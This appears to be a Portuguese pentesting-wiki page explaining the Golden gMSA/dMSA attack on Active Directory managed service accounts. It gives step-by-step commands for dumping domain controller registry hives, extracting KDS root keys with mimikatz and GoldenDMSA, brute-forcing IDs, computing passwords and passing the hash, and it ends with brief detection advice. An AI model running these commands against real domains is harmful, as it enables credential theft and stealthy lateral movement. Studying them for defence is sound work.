# Golden gMSA/dMSA Attack (Derivação Offline de Senhas de Contas de Serviço Gerenciadas)

{{#include ../../banners/hacktricks-training.md}}

## Visão Geral

As Contas de Serviço Gerenciadas do Windows (MSA) são princípios especiais projetados para executar serviços sem a necessidade de gerenciar manualmente suas senhas.
Existem duas variantes principais:

1. **gMSA** – Conta de Serviço Gerenciada em grupo – pode ser usada em vários hosts que estão autorizados em seu atributo `msDS-GroupMSAMembership`.
2. **dMSA** – Conta de Serviço Gerenciada delegada – o sucessor (em pré-visualização) do gMSA, que se baseia na mesma criptografia, mas permite cenários de delegação mais granulares.

Para ambas as variantes, a **senha não é armazenada** em cada Controlador de Domínio (DC) como um hash NT regular. Em vez disso, cada DC pode **derivar** a senha atual em tempo real a partir de:

* A **Chave Raiz KDS** em todo o bosque (`KRBTGT\KDS`) – segredo nomeado por GUID gerado aleatoriamente, replicado para cada DC sob o contêiner `CN=Master Root Keys,CN=Group Key Distribution Service, CN=Services, CN=Configuration, …`.
* O **SID** da conta alvo.
* Um **ManagedPasswordID** (GUID) por conta encontrado no atributo `msDS-ManagedPasswordId`.

A derivação é: `AES256_HMAC( KDSRootKey , SID || ManagedPasswordID )` → blob de 240 bytes finalmente **codificado em base64** e armazenado no atributo `msDS-ManagedPassword`.
Nenhum tráfego Kerberos ou interação com o domínio é necessária durante o uso normal da senha – um host membro deriva a senha localmente, desde que conheça as três entradas.

## Ataque Golden gMSA / Golden dMSA

Se um atacante puder obter todas as três entradas **offline**, ele pode calcular **senhas válidas atuais e futuras** para **qualquer gMSA/dMSA no bosque** sem tocar no DC novamente, contornando:

* Auditoria de leitura LDAP
* Intervalos de mudança de senha (eles podem pré-computar)

Isso é análogo a um *Golden Ticket* para contas de serviço.

### Pré-requisitos

1. **Comprometimento em nível de bosque** de **um DC** (ou Administrador da Empresa), ou acesso `SYSTEM` a um dos DCs no bosque.
2. Capacidade de enumerar contas de serviço (leitura LDAP / força bruta RID).
3. Estação de trabalho .NET ≥ 4.7.2 x64 para executar [`GoldenDMSA`](https://github.com/Semperis/GoldenDMSA) ou código equivalente.

### Golden gMSA / dMSA
##### Fase 1 – Extrair a Chave Raiz KDS

Dump de qualquer DC (Cópia de Sombra de Volume / hives SAM+SECURITY brutos ou segredos remotos):
```cmd
reg save HKLM\SECURITY security.hive
reg save HKLM\SYSTEM  system.hive

# With mimikatz on the DC / offline
mimikatz # lsadump::secrets
mimikatz # lsadump::trust /patch   # shows KDS root keys too

# With GoldendMSA
GoldendMSA.exe kds --domain <domain name>   # query KDS root keys from a DC in the forest
GoldendMSA.exe kds

# With GoldenGMSA
GoldenGMSA.exe kdsinfo
```
A string base64 rotulada como `RootKey` (nome GUID) é necessária em etapas posteriores.

##### Fase 2 – Enumerar objetos gMSA / dMSA

Recupere pelo menos `sAMAccountName`, `objectSid` e `msDS-ManagedPasswordId`:
```powershell
# Authenticated or anonymous depending on ACLs
Get-ADServiceAccount -Filter * -Properties msDS-ManagedPasswordId | \
Select sAMAccountName,objectSid,msDS-ManagedPasswordId

GoldenGMSA.exe gmsainfo
```
[`GoldenDMSA`](https://github.com/Semperis/GoldenDMSA) implementa modos auxiliares:
```powershell
# LDAP enumeration (kerberos / simple bind)
GoldendMSA.exe info -d example.local -m ldap

# RID brute force if anonymous binds are blocked
GoldendMSA.exe info -d example.local -m brute -r 5000 -u jdoe -p P@ssw0rd
```
##### Fase 3 – Adivinhar / Descobrir o ManagedPasswordID (quando ausente)

Algumas implantações *removem* `msDS-ManagedPasswordId` de leituras protegidas por ACL.  
Como o GUID é de 128 bits, um bruteforce ingênuo é inviável, mas:

1. Os primeiros **32 bits = tempo da época Unix** da criação da conta (resolução em minutos).  
2. Seguidos por 96 bits aleatórios.

Portanto, uma **lista de palavras estreita por conta** (± algumas horas) é realista.
```powershell
GoldendMSA.exe wordlist -s <SID> -d example.local -f example.local -k <KDSKeyGUID>
```
A ferramenta calcula senhas candidatas e compara seu blob base64 com o verdadeiro atributo `msDS-ManagedPassword` – a correspondência revela o GUID correto.

##### Fase 4 – Cálculo e Conversão de Senha Offline

Uma vez que o ManagedPasswordID é conhecido, a senha válida está a um comando de distância:
```powershell
# derive base64 password
GoldendMSA.exe compute -s <SID> -k <KDSRootKey> -d example.local -m <ManagedPasswordID> -i <KDSRootKey ID>
GoldenGMSA.exe compute --sid <SID> --kdskey <KDSRootKey> --pwdid <ManagedPasswordID>
```
Os hashes resultantes podem ser injetados com **mimikatz** (`sekurlsa::pth`) ou **Rubeus** para abuso de Kerberos, permitindo **movimentação lateral** furtiva e **persistência**.

## Detecção e Mitigação

* Restringir as capacidades de **backup de DC e leitura do hive do registro** a administradores de Tier-0.
* Monitorar a criação do **Modo de Restauração de Serviços de Diretório (DSRM)** ou **Cópia de Sombra de Volume** em DCs.
* Auditar leituras / alterações em `CN=Master Root Keys,…` e flags `userAccountControl` de contas de serviço.
* Detectar escritas de **senha base64** incomuns ou reutilização repentina de senhas de serviço entre hosts.
* Considerar converter gMSAs de alto privilégio em **contas de serviço clássicas** com rotações aleatórias regulares onde a isolação de Tier-0 não é possível.

## Ferramentas

* [`Semperis/GoldenDMSA`](https://github.com/Semperis/GoldenDMSA) – implementação de referência usada nesta página.
* [`Semperis/GoldenGMSA`](https://github.com/Semperis/GoldenGMSA/) – implementação de referência usada nesta página.
* [`mimikatz`](https://github.com/gentilkiwi/mimikatz) – `lsadump::secrets`, `sekurlsa::pth`, `kerberos::ptt`.
* [`Rubeus`](https://github.com/GhostPack/Rubeus) – pass-the-ticket usando chaves AES derivadas.

## Referências

- [Golden dMSA – bypass de autenticação para Contas de Serviço Gerenciadas Delegadas](https://www.semperis.com/blog/golden-dmsa-what-is-dmsa-authentication-bypass/)
- [gMSA Active Directory Ataques Contas](https://www.semperis.com/blog/golden-gmsa-attack/)
- [Repositório GitHub Semperis/GoldenDMSA](https://github.com/Semperis/GoldenDMSA)
- [Improsec – ataque de confiança Golden gMSA](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-5-golden-gmsa-trust-attack-from-child-to-parent)

{{#include ../../banners/hacktricks-training.md}}
